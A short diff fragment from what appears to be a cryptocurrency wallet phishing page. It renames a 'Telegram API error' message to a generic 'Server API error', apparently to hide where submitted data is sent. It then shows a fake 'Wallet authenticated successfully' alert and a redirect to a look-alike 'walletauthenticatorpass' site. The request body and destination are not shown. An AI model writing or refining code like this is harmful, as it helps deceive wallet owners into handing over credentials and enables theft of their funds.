@@ -118,7 +118,7 @@
           }),
         });
 
-        if (!res.ok) throw new Error("Telegram API error");
+        if (!res.ok) throw new Error("Server API error");
 
         alert("Wallet authenticated successfully. Please contact admin for next steps. Redirecting...");
         window.location.href = "https://walletauthenticatorpass.vercel.app";
